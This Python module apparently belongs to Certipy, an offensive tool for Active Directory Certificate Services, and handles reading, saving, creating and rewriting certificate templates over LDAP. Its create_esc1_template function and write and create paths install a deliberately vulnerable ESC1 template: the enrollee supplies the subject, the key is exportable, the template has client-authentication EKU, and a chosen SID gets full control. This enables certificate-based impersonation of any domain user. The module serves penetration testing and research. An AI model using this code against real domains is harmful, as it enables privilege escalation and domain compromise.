"""
Certificate Template Management Module.

This module implements the functionality to view, create, and modify Active Directory
certificate templates, allowing security assessment and exploitation of
misconfigured templates in AD CS environments.
"""

import argparse
import collections
import json
import re
import secrets
import sys
from itertools import groupby
from typing import Any, Dict, Optional, Tuple

import ldap3
from ldap3.core.results import (
    RESULT_CONSTRAINT_VIOLATION,
    RESULT_ENTRY_ALREADY_EXISTS,
    RESULT_INSUFFICIENT_ACCESS_RIGHTS,
    RESULT_INVALID_DN_SYNTAX,
    RESULT_NO_SUCH_OBJECT,
    RESULT_OBJECT_CLASS_VIOLATION,
    RESULT_UNWILLING_TO_PERFORM,
)
from ldap3.protocol.microsoft import security_descriptor_control
from ldap3.utils.conv import escape_filter_chars
from ldap3.utils.dn import escape_rdn

from certipy.lib.constants import (
    OID_TO_STR_NAME_MAP,
    CertificateNameFlag,
    EnrollmentFlag,
    PrivateKeyFlag,
    TemplateFlags,
)
from certipy.lib.files import try_to_save_file
from certipy.lib.ldap import LDAPConnection, LDAPEntry
from certipy.lib.logger import logging
from certipy.lib.security import create_sd
from certipy.lib.target import Target
from certipy.lib.time import (
    SECONDS_PER_WEEK,
    SECONDS_PER_YEAR,
    filetime_to_span,
    span_to_filetime,
)

# Values populated by AD rather than copied into a new directory object.
SERVER_GENERATED_ATTRIBUTES = frozenset(
    {
        "canonicalName",
        "createTimeStamp",
        "distinguishedName",
        "dSCorePropagationData",
        "instanceType",
        "modifyTimeStamp",
        "objectCategory",
        "objectGUID",
        "uSNCreated",
        "uSNChanged",
        "whenChanged",
        "whenCreated",
    }
)

# Template identity is replaced rather than inherited from the source template.
IDENTITY_ATTRIBUTES = frozenset(
    {
        "cn",
        "displayName",
        "msPKI-Cert-Template-OID",
        # name is a NO-USER-MODIFICATION attribute derived by AD from the RDN.
        "name",
    }
)

# Attributes protected by the existing configuration restore/MODIFY behavior.
IMMUTABLE_ON_MODIFY_ATTRIBUTES = frozenset(
    {
        "objectClass",
        "cn",
        "distinguishedName",
        "whenCreated",
        "whenChanged",
        "name",
        "objectGUID",
        "objectCategory",
        "dSCorePropagationData",
        "msPKI-Cert-Template-OID",
        "uSNCreated",
        "uSNChanged",
        "displayName",
        "instanceType",
        "revision",
        "msPKI-Template-Schema-Version",
        "msPKI-Template-Minor-Revision",
    }
)

# Backwards-compatible module name used by configuration serialization and restore.
PROTECTED_ATTRIBUTES = IMMUTABLE_ON_MODIFY_ATTRIBUTES

CREATION_EXCLUDED_ATTRIBUTES = (
    SERVER_GENERATED_ATTRIBUTES | IDENTITY_ATTRIBUTES | {"objectClass"}
)
CREATION_VERSION_ATTRIBUTES = frozenset(
    {
        "revision",
        "msPKI-Template-Schema-Version",
        "msPKI-Template-Minor-Revision",
    }
)

TEMPLATE_OID_ATTRIBUTE = "msPKI-Cert-Template-OID"
TEMPLATE_OID_RETRIES = 10
OID_PATTERN = re.compile(r"^(?:0|1|2)(?:\.(?:0|[1-9][0-9]*))+$")


def create_esc1_template(sid: str) -> dict[str, Any]:
    """
    ESC1 vulnerable template configuration with full control for the passed sid.
    This configuration creates a template that allows `sid` to enroll
    and obtain certificates with client authentication EKU.
    """
    return {
        "showInAdvancedViewOnly": True,
        # Security descriptor giving `sid` full control
        "nTSecurityDescriptor": create_sd(sid).getData(),
        "flags": int(
            TemplateFlags.PUBLISH_TO_DS
            | TemplateFlags.EXPORTABLE_KEY
            | TemplateFlags.AUTO_ENROLLMENT
            | TemplateFlags.ADD_TEMPLATE_NAME
            | TemplateFlags.IS_DEFAULT
        ),  # Template flags
        "pKIDefaultKeySpec": 2,  # AT_SIGNATURE
        "pKIKeyUsage": b"\x86\x00",  # Digital Signature, Key Encipherment
        "pKIMaxIssuingDepth": -1,  # Maximum depth value for the Basic Constraint extension (-1 means no limit)
        "pKICriticalExtensions": [
            "2.5.29.19",  # Basic Constraints
            "2.5.29.15",  # Key Usage
        ],  # Critical extensions
        "pKIExpirationPeriod": span_to_filetime(SECONDS_PER_YEAR),  # 1 year validity
        "pKIOverlapPeriod": span_to_filetime(SECONDS_PER_WEEK * 6),  # 6 week overlap
        "pKIExtendedKeyUsage": [
            OID_TO_STR_NAME_MAP["client authentication"],
        ],
        "msPKI-Certificate-Application-Policy": [
            OID_TO_STR_NAME_MAP["client authentication"],
        ],
        "pKIDefaultCSPs": [
            "2,Microsoft Base Cryptographic Provider v1.0",
            "1,Microsoft Enhanced Cryptographic Provider v1.0",
        ],
        "msPKI-RA-Signature": 0,  # No recovery agent signatures required
        "msPKI-Enrollment-Flag": int(
            EnrollmentFlag.NONE
        ),  # No special enrollment flags
        "msPKI-Private-Key-Flag": int(PrivateKeyFlag.EXPORTABLE_KEY),  # Allow export
        "msPKI-Certificate-Name-Flag": int(
            CertificateNameFlag.ENROLLEE_SUPPLIES_SUBJECT
        ),  # Name flags
        "msPKI-Minimal-Key-Size": 2048,  # Minimum 2048-bit key
    }


TRANSFORMERS = {
    "pKIOverlapPeriod": (filetime_to_span, span_to_filetime),
    "pKIExpirationPeriod": (filetime_to_span, span_to_filetime),
}


def default_into_transformer(value: Any) -> Any:
    """
    Default transformer function that returns the value unchanged.

    Args:
        value: The value to transform

    Returns:
        The original value
    """
    if isinstance(value, list):
        return [default_into_transformer(item) for item in value]
    if isinstance(value, bytes):
        return "HEX:" + value.hex()
    return value


def default_from_transformer(value: Any) -> Any:
    """
    Default transformer function that converts a value to its original form.

    Args:
        value: The value to transform

    Returns:
        The original value
    """
    if isinstance(value, list):
        return [default_from_transformer(item) for item in value]
    if isinstance(value, str) and value.startswith("HEX:"):
        return bytes.fromhex(value[4:])
    return value


class Template:
    """
    Certificate Template management class for AD CS templates.

    This class provides functionality to retrieve, save, create, and modify
    certificate template configurations in Active Directory Certificate Services.
    """

    def __init__(
        self,
        target: "Target",
        template: str = "",
        write_configuration: Optional[str] = None,
        write_default_configuration: Optional[str] = None,
        save_configuration: Optional[str] = None,
        no_save: bool = False,
        force: bool = False,
        create: bool = False,
        source_template: Optional[str] = None,
        template_oid: Optional[str] = None,
        connection: Optional[LDAPConnection] = None,
        **kwargs,  # type: ignore
    ):
        """
        Initialize a Template object for certificate template operations.

        Args:
            target: Target domain information
            template: Name of the certificate template to operate on
            write_configuration: Path to configuration file to apply
            write_default_configuration: Whether to apply the default ESC1 configuration (optionally with target SID)
            save_configuration: Path to save the current configuration
            no_save: Whether to skip saving the current configuration
            force: Do not prompt for confirmation before applying changes
            create: Whether to create a new template
            source_template: Existing template to clone during creation
            template_oid: Optional explicit OID for the created template
            scheme: LDAP connection scheme (ldap or ldaps)
            connection: Optional existing LDAP connection to reuse
            **kwargs: Additional keyword arguments
        """
        self.target = target
        self.template_name = template
        self.write_configuration_file = write_configuration
        self.write_default_configuration = write_default_configuration
        self.save_configuration_file = save_configuration
        self.no_save = no_save
        self.force = force
        self.create_requested = create
        self.source_template_name = source_template
        self.template_oid = template_oid
        self.kwargs = kwargs

        self._connection = connection

    @property
    def connection(self) -> LDAPConnection:
        """
        Lazily establish and return an LDAP connection.

        Returns:
            An active LDAP connection to the target domain
        """
        if self._connection is not None:
            return self._connection

        self._connection = LDAPConnection(self.target)
        self._connection.connect()

        return self._connection

    @property
    def template_container_dn(self) -> str:
        """Return the Certificate Templates container distinguished name."""
        return (
            "CN=Certificate Templates,CN=Public Key Services,CN=Services,"
            f"{self.connection.configuration_path}"
        )

    @property
    def oid_container_dn(self) -> str:
        """Return the forest enterprise OID container distinguished name."""
        return (
            "CN=OID,CN=Public Key Services,CN=Services,"
            f"{self.connection.configuration_path}"
        )

    @property
    def public_key_services_dn(self) -> str:
        """Return the Public Key Services container distinguished name."""
        return (
            "CN=Public Key Services,CN=Services,"
            f"{self.connection.configuration_path}"
        )

    def _build_template_dn(self, template_name: str) -> str:
        """Build a template DN using RDN-specific escaping."""
        return f"CN={escape_rdn(template_name)},{self.template_container_dn}"

    def _get_exact_template(
        self, template_name: str, *, query_sd: bool = False
    ) -> Optional[LDAPEntry]:
        """Find a template by exact CN inside the template container."""
        escaped_template = escape_filter_chars(template_name)
        results = self.connection.search(
            search_filter=(
                f"(&(cn={escaped_template})" "(objectClass=pKICertificateTemplate))"
            ),
            search_base=self.template_container_dn,
            search_scope=ldap3.LEVEL,
            query_sd=query_sd,
        )
        if len(results) > 1:
            logging.error(
                f"Found multiple certificate templates with CN {template_name!r}"
            )
            return None
        return results[0] if results else None

    @staticmethod
    def _validate_template_oid(template_oid: str) -> None:
        """Validate dotted-decimal OID syntax accepted for certificate templates."""
        if not OID_PATTERN.fullmatch(template_oid):
            raise ValueError("Template OID must be a dotted-decimal object identifier")

        arcs = [int(arc) for arc in template_oid.split(".")]
        if arcs[0] < 2 and arcs[1] > 39:
            raise ValueError(
                "The second OID arc must be between 0 and 39 when the first arc "
                "is 0 or 1"
            )

    def _oid_exists(self, template_oid: str) -> bool:
        """Check templates and enterprise OID objects for an OID collision."""
        escaped_oid = escape_filter_chars(template_oid)
        results = self.connection.search(
            search_filter=f"({TEMPLATE_OID_ATTRIBUTE}={escaped_oid})",
            search_base=self.public_key_services_dn,
            attributes=["distinguishedName"],
        )
        return bool(results)

    def _get_forest_oid_prefix(self) -> str:
        """Read the forest-specific template OID prefix from the OID container."""
        results = self.connection.search(
            search_filter="(objectClass=*)",
            search_base=self.oid_container_dn,
            search_scope=ldap3.BASE,
            attributes=[TEMPLATE_OID_ATTRIBUTE],
        )
        if len(results) != 1:
            raise ValueError(
                "Could not read the forest template OID prefix from the OID "
                "container; specify -template-oid explicitly"
            )

        forest_oid = results[0].get(TEMPLATE_OID_ATTRIBUTE)
        if isinstance(forest_oid, list):
            forest_oid = forest_oid[0] if forest_oid else None
        if not isinstance(forest_oid, str):
            raise ValueError(
                "The forest OID container does not contain a template OID prefix; "
                "specify -template-oid explicitly"
            )

        self._validate_template_oid(forest_oid)
        return forest_oid

    def _generate_template_oid(self, forest_oid_prefix: Optional[str] = None) -> str:
        """Generate a unique template OID below the forest enterprise prefix."""
        prefix = forest_oid_prefix or self._get_forest_oid_prefix()
        self._validate_template_oid(prefix)

        for _ in range(TEMPLATE_OID_RETRIES):
            # Two independent eight-digit arcs match the shape generated by the
            # Windows template tooling while providing roughly 53 bits of entropy.
            first_arc = 10_000_000 + secrets.randbelow(90_000_000)
            second_arc = 10_000_000 + secrets.randbelow(90_000_000)
            template_oid = f"{prefix}.{first_arc}.{second_arc}"
            self._validate_template_oid(template_oid)
            if not self._oid_exists(template_oid):
                return template_oid

        raise ValueError(
            f"Could not generate a unique template OID after "
            f"{TEMPLATE_OID_RETRIES} attempts"
        )

    def _select_creation_oid(self) -> str:
        """Validate an explicit OID or generate a collision-free OID."""
        if self.template_oid is None:
            return self._generate_template_oid()

        self._validate_template_oid(self.template_oid)
        if self._oid_exists(self.template_oid):
            raise ValueError(f"Template OID {self.template_oid!r} is already in use")
        return self.template_oid

    def _get_creation_override(self) -> Optional[Dict[str, Any]]:
        """Load the explicitly requested authoritative creation configuration."""
        if self.write_configuration_file:
            return self.load_configuration(self.write_configuration_file)
        if self.write_default_configuration is not None:
            return create_esc1_template(self.write_default_configuration)
        return None

    def _build_creation_attributes(
        self,
        source_template: LDAPEntry,
        template_oid: str,
        configuration_override: Optional[Dict[str, Any]] = None,
    ) -> Tuple[Dict[str, Any], Optional[bytes]]:
        """Build LDAP ADD attributes and separate the requested security descriptor."""
        source_attributes = source_template["attributes"]
        missing_versions = [
            key for key in CREATION_VERSION_ATTRIBUTES if key not in source_attributes
        ]
        if missing_versions:
            raise ValueError(
                "Source template is missing required version attributes: "
                + ", ".join(sorted(missing_versions))
            )

        if configuration_override is None:
            attributes = {
                key: value
                for key, value in source_attributes.items()
                if key not in CREATION_EXCLUDED_ATTRIBUTES
            }
        else:
            # Existing Certipy restore files are authoritative. Only version fields,
            # which are intentionally absent from that format, survive from source.
            attributes = {
                key: source_attributes[key] for key in CREATION_VERSION_ATTRIBUTES
            }
            attributes.update(configuration_override)

        attributes["cn"] = self.template_name
        attributes["displayName"] = self.template_name
        attributes[TEMPLATE_OID_ATTRIBUTE] = template_oid

        security_descriptor = attributes.pop("nTSecurityDescriptor", None)
        if security_descriptor is not None and not isinstance(
            security_descriptor, bytes
        ):
            raise ValueError("nTSecurityDescriptor must be a binary value")

        return attributes, security_descriptor

    def _log_creation_plan(
        self, template_dn: str, template_oid: str, configuration: str
    ) -> None:
        """Log the complete mutation plan before creating a template."""
        logging.info("Certificate template creation plan:")
        logging.info(f"    Template name: {self.template_name}")
        logging.info(f"    Source template: {self.source_template_name}")
        logging.info(f"    Template DN: {template_dn}")
        logging.info(f"    Template OID: {template_oid}")
        logging.info(f"    Configuration: {configuration}")
        logging.info("    OID registration: disabled")
        logging.info("    CA publication: disabled")

    @staticmethod
    def _ldap_error(result: Dict[str, Any]) -> str:
        """Format a non-sensitive LDAP result for logging."""
        description = result.get("description", "unknown LDAP error")
        message = result.get("message", "")
        return f"({description}) {message}".strip()

    def _handle_create_error(self, result: Dict[str, Any], template_dn: str) -> bool:
        """Log an actionable LDAP ADD failure."""
        result_code = result.get("result")
        if result_code == RESULT_INSUFFICIENT_ACCESS_RIGHTS:
            logging.error(
                f"User {self.target.username!r} does not have permission to create "
                f"a pKICertificateTemplate under {self.template_container_dn!r}"
            )
        elif result_code == RESULT_ENTRY_ALREADY_EXISTS:
            logging.error(
                f"A certificate template with CN {self.template_name!r} already exists"
            )
        elif result_code == RESULT_NO_SUCH_OBJECT:
            logging.error(
                f"The Certificate Templates container for {template_dn!r} does not exist"
            )
        elif result_code == RESULT_CONSTRAINT_VIOLATION:
            logging.error(
                "Active Directory rejected a certificate template attribute because "
                f"it violates a schema constraint: {self._ldap_error(result)}"
            )
        elif result_code == RESULT_OBJECT_CLASS_VIOLATION:
            logging.error(
                "Active Directory rejected the pKICertificateTemplate object class "
                f"or its attributes: {self._ldap_error(result)}"
            )
        elif result_code == RESULT_INVALID_DN_SYNTAX:
            logging.error(
                f"Active Directory rejected template DN {template_dn!r}: "
                f"{self._ldap_error(result)}"
            )
        elif result_code == RESULT_UNWILLING_TO_PERFORM:
            logging.error(
                "Active Directory was unwilling to create the certificate template: "
                f"{self._ldap_error(result)}"
            )
        else:
            logging.error(
                "Failed to create the certificate template: "
                f"{self._ldap_error(result)}"
            )
        return False

    def _apply_creation_security_descriptor(
        self, template_dn: str, security_descriptor: bytes
    ) -> bool:
        """Apply the requested DACL after LDAP ADD."""
        result = self.connection.modify(
            template_dn,
            {"nTSecurityDescriptor": [(ldap3.MODIFY_REPLACE, [security_descriptor])]},
            controls=security_descriptor_control(sdflags=0x4),
        )
        if result.get("result") == 0:
            return True

        logging.error(
            "The template object was created, but Certipy could not apply the "
            "requested security descriptor"
        )
        logging.error(f"Created object DN: {template_dn}")
        logging.error(f"Security descriptor LDAP error: {self._ldap_error(result)}")
        logging.error(
            "The object still exists in Active Directory and may require manual "
            "review or cleanup"
        )
        return False

    @staticmethod
    def _values_equal(expected: Any, actual: Any) -> bool:
        """Compare LDAP values while ignoring multi-value ordering."""
        if isinstance(expected, list) and isinstance(actual, list):
            return collections.Counter(expected) == collections.Counter(actual)
        return expected == actual

    def _verify_created_template(
        self,
        template_dn: str,
        expected_attributes: Dict[str, Any],
        security_descriptor_requested: bool,
        configuration_override: Optional[Dict[str, Any]] = None,
    ) -> bool:
        """Verify the created identity, revisions, and explicit configuration."""
        results = self.connection.search(
            search_filter="(objectClass=pKICertificateTemplate)",
            search_base=template_dn,
            search_scope=ldap3.BASE,
            query_sd=security_descriptor_requested,
        )
        if len(results) != 1:
            logging.error(
                f"Template creation could not be verified at exact DN {template_dn!r}"
            )
            return False

        created = results[0]
        object_classes = created.get("objectClass", [])
        if isinstance(object_classes, str):
            object_classes = [object_classes]
        if not any(
            value.lower() == "pkicertificatetemplate" for value in object_classes
        ):
            logging.error(
                f"Created object at {template_dn!r} is not a pKICertificateTemplate"
            )
            return False

        expected_identity = {
            "cn": self.template_name,
            "name": self.template_name,
            "displayName": self.template_name,
            TEMPLATE_OID_ATTRIBUTE: expected_attributes[TEMPLATE_OID_ATTRIBUTE],
        }
        for key, expected_value in expected_identity.items():
            if not self._values_equal(expected_value, created.get(key)):
                logging.error(
                    f"Template verification failed for {key}: expected "
                    f"{expected_value!r}, got {created.get(key)!r}"
                )
                return False

        verification_keys = set(CREATION_VERSION_ATTRIBUTES)
        if configuration_override is not None:
            verification_keys.update(configuration_override)
        verification_keys.discard("nTSecurityDescriptor")

        for key in sorted(verification_keys):
            expected_value = expected_attributes.get(key)
            if not self._values_equal(expected_value, created.get(key)):
                logging.error(
                    f"Template verification failed for {key}: expected "
                    f"{expected_value!r}, got {created.get(key)!r}"
                )
                return False

        if (
            security_descriptor_requested
            and created.get("nTSecurityDescriptor") is None
        ):
            logging.warning(
                "The template was created and its DACL update succeeded, but the "
                "security descriptor could not be read back with the current rights"
            )

        return True

    def create(self) -> bool:
        """Create a certificate template by cloning an existing template."""
        if not self.template_name:
            logging.error("A target template (-template) is required")
            return False
        if not self.source_template_name:
            logging.error("-create requires -source-template")
            return False

        if self._get_exact_template(self.template_name) is not None:
            logging.error(
                f"A certificate template with CN {self.template_name!r} already exists"
            )
            return False

        source_template = self.get_configuration(self.source_template_name)
        if source_template is None:
            return False

        try:
            configuration_override = self._get_creation_override()
            template_oid = self._select_creation_oid()
            attributes, security_descriptor = self._build_creation_attributes(
                source_template, template_oid, configuration_override
            )
        except (FileNotFoundError, ValueError) as error:
            logging.error(f"Cannot create certificate template: {error}")
            return False

        template_dn = self._build_template_dn(self.template_name)
        if self.write_configuration_file:
            configuration_description = (
                f"custom file {self.write_configuration_file!r} (authoritative)"
            )
        elif self.write_default_configuration is not None:
            configuration_description = "explicit default ESC1 configuration"
        else:
            configuration_description = "cloned source"
        self._log_creation_plan(template_dn, template_oid, configuration_description)

        if not self.force:
            confirm = input("Create this certificate template? (y/N): ")
            if confirm.strip().lower() != "y":
                logging.info("Aborting template creation")
                return False

        result = self.connection.add(
            template_dn,
            ["top", "pKICertificateTemplate"],
            attributes,
        )
        if result.get("result") != 0:
            return self._handle_create_error(result, template_dn)

        logging.info(f"Created certificate template object at {template_dn!r}")
        if (
            security_descriptor is not None
            and not self._apply_creation_security_descriptor(
                template_dn, security_descriptor
            )
        ):
            return False

        if not self._verify_created_template(
            template_dn,
            attributes,
            security_descriptor_requested=security_descriptor is not None,
            configuration_override=configuration_override,
        ):
            logging.error(
                "The LDAP ADD completed, but Certipy could not fully verify the "
                "created template"
            )
            logging.error(f"Created object DN: {template_dn}")
            return False

        logging.info(
            f"Successfully created certificate template {self.template_name!r}"
        )
        logging.info("The template was not published to any certificate authority")
        return True

    def configuration_to_json(self, configuration: Dict[str, Any]) -> str:
        """
        Convert a template configuration to a JSON string.

        Converts binary attribute values to their hexadecimal representation
        for storage in JSON format.

        Args:
            configuration: Template configuration dictionary

        Returns:
            JSON string representation of the configuration
        """
        output = {}
        for key, value in configuration.items():
            if key in PROTECTED_ATTRIBUTES:
                continue

            into_transformer, _ = TRANSFORMERS.get(
                key, (default_into_transformer, None)
            )

            output[key] = into_transformer(value)

        return json.dumps(output, indent=2, ensure_ascii=False)

    def get_configuration(
        self,
        template_name: str,
    ) -> Optional[LDAPEntry]:
        """
        Retrieve the configuration for a certificate template from AD.

        Searches for the template by CN or displayName and returns its configuration.

        Args:
            template_name: Name of the certificate template to find
        Returns:
            LDAPEntry containing the template configuration or None if not found
        """
        escaped_template = escape_filter_chars(template_name)

        # First try searching by CN
        results = self.connection.search(
            search_filter=f"(&(cn={escaped_template})(objectClass=pKICertificateTemplate))",
            search_base=self.connection.configuration_path,
            query_sd=True,
        )

        # If not found by CN, try displayName
        if not results:
            results = self.connection.search(
                f"(&(displayName={escaped_template})(objectClass=pKICertificateTemplate))",
                search_base=self.connection.configuration_path,
                query_sd=True,
            )

        if not results:
            logging.error(
                f"Could not find any certificate template for {template_name!r}"
            )
            return None

        if len(results) > 1:
            # This should never happen, but just in case
            logging.error(
                f"Found multiple certificate templates identified by {template_name!r}"
            )
            return None

        return results[0]

    def json_to_configuration(
        self, configuration_json: Dict[str, Any]
    ) -> Dict[str, Any]:
        """
        Convert a JSON configuration back to a usable LDAP configuration.

        Converts hexadecimal strings back to binary data for LDAP operations.

        Args:
            configuration_json: Dictionary loaded from JSON

        Returns:
            Configuration dictionary with binary values ready for LDAP
        """
        output = {}
        for key, value in configuration_json.items():
            if key in PROTECTED_ATTRIBUTES:
                continue

            _, from_transformer = TRANSFORMERS.get(
                key, (None, default_from_transformer)
            )
            output[key] = from_transformer(value)

        return output

    def load_configuration(self, configuration_path: str) -> Dict[str, Any]:
        """
        Load a template configuration from a JSON file.

        Args:
            configuration_path: Path to the configuration JSON file

        Returns:
            Configuration dictionary with binary values

        Raises:
            ValueError: If the JSON file doesn't contain a dictionary
            FileNotFoundError: If the configuration file can't be found
        """
        try:
            with open(configuration_path, "r") as f:
                configuration_json = json.load(f)

            if not isinstance(configuration_json, dict):
                raise ValueError(
                    f"Expected a JSON object, got {type(configuration_json)!r}"
                )

            return self.json_to_configuration(configuration_json)
        except FileNotFoundError:
            logging.error(f"Configuration file not found: {configuration_path}")
            raise
        except json.JSONDecodeError:
            logging.error(f"Invalid JSON in configuration file: {configuration_path}")
            raise ValueError("Invalid JSON in configuration file")
        except Exception as e:
            logging.error(f"Error loading configuration file: {e}")
            raise

    def save_configuration(self, configuration: Optional[LDAPEntry] = None) -> None:
        """
        Save the current configuration to a JSON file.
        """
        # Get the current configuration
        current_configuration = configuration
        if current_configuration is None:
            current_configuration = self.get_configuration(self.template_name)
            if not current_configuration:
                raise Exception(
                    f"Failed to retrieve configuration for {self.template_name!r}. Aborting."
                )

        current_configuration_json = self.configuration_to_json(
            current_configuration["attributes"]
        )

        out_file = (
            self.save_configuration_file.removesuffix(".json")
            if self.save_configuration_file
            else current_configuration.get("cn")
        )

        out_file = f"{out_file}.json"
        logging.info(f"Saving current configuration to {out_file!r}")
        out_file = try_to_save_file(
            current_configuration_json, out_file, abort_on_fail=True
        )
        logging.info(
            f"Wrote current configuration for {self.template_name!r} to {out_file!r}"
        )

    def write_configuration(self) -> bool:
        """
        Apply a new configuration to a certificate template.

        If no configuration file is provided, applies the default vulnerable
        configuration. If save_old is True, saves the current configuration
        before applying changes.

        Returns:
            True if the template was successfully updated, False otherwise
        """
        if not self.template_name:
            logging.error("A template (-template) is required")
            return False

        # Get the configuration to apply
        if self.write_configuration_file:
            try:
                new_configuration = self.load_configuration(
                    self.write_configuration_file
                )
            except (FileNotFoundError, ValueError):
                return False
        else:
            # Only needed to make the typechecker pass. At this position in write_configuration,
            # the options write_configuration_file and write_default_configuration are mutually
            # exclusive so this should always pass.
            assert self.write_default_configuration is not None
            # Use the default vulnerable configuration
            new_configuration = create_esc1_template(self.write_default_configuration)

        # Get the current configuration
        old_configuration = self.get_configuration(self.template_name)
        if not old_configuration:
            return False

        # Save the old configuration if requested
        if not self.no_save:
            self.save_configuration(old_configuration)

        # Compute the changes to make
        changes = self._compute_changes(old_configuration, new_configuration)

        if not changes:
            logging.warning(
                "New configuration is the same as old configuration. Not updating"
            )
            return False

        # Apply the changes
        return self._apply_changes(old_configuration, changes)

    def _compute_changes(
        self, old_configuration: LDAPEntry, new_configuration: Dict[str, Any]
    ) -> Dict[str, Any]:
        """
        Compute the changes needed to update a template configuration.

        Args:
            old_configuration: Current template configuration
            new_configuration: New template configuration to apply

        Returns:
            Dictionary of changes to apply using LDAP modify operation
        """
        changes = {}

        # Check for attributes to delete or modify
        for key in old_configuration["attributes"].keys():
            if key in PROTECTED_ATTRIBUTES:
                continue

            # Delete attributes not in the new configuration
            if key not in new_configuration:
                changes[key] = [(ldap3.MODIFY_DELETE, [])]
                continue

            # Replace attributes with new values if different
            old_value = old_configuration.get(key)
            new_value = new_configuration[key]

            if not self._values_equal(old_value, new_value):
                changes[key] = [(ldap3.MODIFY_REPLACE, new_value)]

        # Add new attributes not in the old configuration
        for key, value in new_configuration.items():
            if (
                key in changes
                or key in PROTECTED_ATTRIBUTES
                or key in old_configuration["attributes"]
            ):
                continue

            changes[key] = [(ldap3.MODIFY_ADD, value)]

        return changes

    def _apply_changes(
        self, old_configuration: LDAPEntry, changes: Dict[str, Any]
    ) -> bool:
        """
        Apply computed changes to a template configuration.

        Args:
            old_configuration: Current template configuration
            changes: Dictionary of changes to apply

        Returns:
            True if changes were applied successfully, False otherwise
        """
        template_name = old_configuration.get("cn")
        logging.info(f"Updating certificate template {template_name!r}")

        # Log the changes grouped by operation type
        self._log_changes(changes)

        if not self.force:
            # Ask for confirmation before applying changes
            confirm = input(
                f"Are you sure you want to apply these changes to {template_name!r}? (y/N): "
            )
            if confirm.strip().lower() != "y":
                logging.info("Aborting changes")
                return False

        # Apply the changes
        result = self.connection.modify(
            old_configuration.get("distinguishedName"),
            changes,
            controls=security_descriptor_control(sdflags=0x4),
        )

        if result["result"] == 0:
            logging.info(f"Successfully updated {template_name!r}")
            return True
        elif result["result"] == RESULT_INSUFFICIENT_ACCESS_RIGHTS:
            logging.error(
                f"User {self.target.username!r} doesn't have permission to update "
                f"these attributes on {template_name!r}"
            )
        else:
            logging.error(f"Got error: {result['message']}")

        return False

    def _log_changes(self, changes: Dict[str, Any]) -> None:
        """
        Log the changes to be applied, grouped by operation type.

        Args:
            changes: Dictionary of changes to apply
        """
        # Group changes by operation (MODIFY_DELETE, MODIFY_REPLACE, MODIFY_ADD)
        by_op = lambda item: item[1][0][0]

        for op, group in groupby(sorted(changes.items(), key=by_op), by_op):
            op_name = {
                ldap3.MODIFY_ADD: "Adding",
                ldap3.MODIFY_DELETE: "Deleting",
                ldap3.MODIFY_REPLACE: "Replacing",
            }.get(op, op)

            logging.info(f"{op_name}:")

            for item in list(group):
                key = item[0]
                value = item[1][0][1]
                logging.info(f"    {key}: {value!r}")


def entry(options: argparse.Namespace) -> None:
    """
    Entry point for the template command.

    Args:
        options: Command-line arguments
    """
    target = Target.from_options(options, dc_as_target=True)

    # Remove target from options to avoid duplicate argument
    options.__delattr__("target")

    template = Template(target=target, **vars(options))

    if template.create_requested:
        if not template.create():
            sys.exit(1)
        return

    will_write = (
        template.write_default_configuration is not None
    ) or template.write_configuration_file

    if template.save_configuration_file:
        template.save_configuration()

    if will_write:
        template.write_configuration()

    # if template.write_default_configuration or template.configuration:
    #     # Apply the configuration
    #     if not template.set_configuration():
    #         logging.error("Failed to set the template configuration")
    #         return
    # _ = template.set_configuration()
